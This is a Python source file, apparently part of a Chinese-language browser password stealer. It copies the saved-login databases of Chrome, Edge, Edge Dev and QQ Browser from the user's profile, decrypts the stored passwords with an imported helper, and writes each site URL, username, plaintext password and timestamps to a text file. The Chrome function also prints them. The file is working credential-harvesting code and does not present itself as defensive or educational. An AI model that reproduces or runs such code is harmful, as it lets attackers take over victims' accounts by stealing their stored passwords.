import os
import shutil
import sqlite3

from 浏览器密码获取 import decrypt_password, get_chrome_datetime


def get_password_chrome(key):
    date = ''

    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    if os.path.exists(db_path):
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_created")
        # 遍历所有行
        out_file = open('date.txt', '+w', encoding='gbk')
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]

            if username or password:
                date = date + f"初始URL: {origin_url}\n活动URL: {action_url}\n账号: {username}\n密码: {password}\n"
            else:
                continue
            if date_created != 86400000000 and date_created:
                date = date + f"初始时间: {str(get_chrome_datetime(date_created))}\n"
            if date_last_used != 86400000000 and date_last_used:
                date = date + f"最后时间: {str(get_chrome_datetime(date_last_used))}\n"
            date = date + '=' * 20 + '\n'
            # date = date.encode('utf-8').decode('unicode_escape')
            # date = date.encode('gbk')
            out_file.write(rf'{date}')
            print(date)
        cursor.close()
        db.close()
        out_file.close()
        try:
            # 删除复制的db文件
            os.remove(filename)
        except:
            pass


def get_password_edge(key):
    date = ''
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Microsoft", "Edge", "User Data", "Default", "Login Data")
    filename = "EdgeData.db"
    if os.path.exists(db_path):
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_created")
        # 遍历所有行
        out_file = open('date.txt', '+w', encoding='gbk')
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]

            if username or password:
                date = date + f"初始URL: {origin_url}\n活动URL: {action_url}\n账号: {username}\n密码: {password}\n"
            else:
                continue
            if date_created != 86400000000 and date_created:
                date = date + f"初始时间: {str(get_chrome_datetime(date_created))}\n"
            if date_last_used != 86400000000 and date_last_used:
                date = date + f"最后时间: {str(get_chrome_datetime(date_last_used))}\n"
            date = date + '=' * 20 + '\n'
            # date = date.encode('utf-8').decode('unicode_escape')
            # date = date.encode('gbk')
            out_file.write(rf'{date}')

        cursor.close()
        db.close()
        out_file.close()
        try:
            # 删除复制的db文件
            os.remove(filename)
        except:
            pass


def get_password_edge_dev(key):
    date = ''

    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Microsoft", "Edge Dev", "User Data", "Default", "Login Data")
    filename = "EdgeDevData.db"
    if os.path.exists(db_path):
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_created")
        # 遍历所有行
        out_file = open('date.txt', '+w', encoding='gbk')
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]

            if username or password:
                date = date + f"初始URL: {origin_url}\n活动URL: {action_url}\n账号: {username}\n密码: {password}\n"
            else:
                continue
            if date_created != 86400000000 and date_created:
                date = date + f"初始时间: {str(get_chrome_datetime(date_created))}\n"
            if date_last_used != 86400000000 and date_last_used:
                date = date + f"最后时间: {str(get_chrome_datetime(date_last_used))}\n"
            date = date + '=' * 20 + '\n'
            # date = date.encode('utf-8').decode('unicode_escape')
            # date = date.encode('gbk')
            out_file.write(rf'{date}')

        cursor.close()
        db.close()
        out_file.close()
        try:
            # 删除复制的db文件
            os.remove(filename)
        except:
            pass


def get_password_qq(key):
    date = ''

    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Tencent", "QQBrowser", "User Data", "Default", "Login Data")
    filename = "QQData.db"
    if os.path.exists(db_path):
        shutil.copyfile(db_path, filename)
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_created")
        # 遍历所有行
        out_file = open('date.txt', '+w', encoding='gbk')
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]

            if username or password:
                date = date + f"初始URL: {origin_url}\n活动URL: {action_url}\n账号: {username}\n密码: {password}\n"
            else:
                continue
            if date_created != 86400000000 and date_created:
                date = date + f"初始时间: {str(get_chrome_datetime(date_created))}\n"
            if date_last_used != 86400000000 and date_last_used:
                date = date + f"最后时间: {str(get_chrome_datetime(date_last_used))}\n"
            date = date + '=' * 20 + '\n'
            # date = date.encode('utf-8').decode('unicode_escape')
            # date = date.encode('gbk')
            out_file.write(rf'{date}')

        cursor.close()
        db.close()
        out_file.close()
        try:
            # 删除复制的db文件
            os.remove(filename)
        except:
            pass
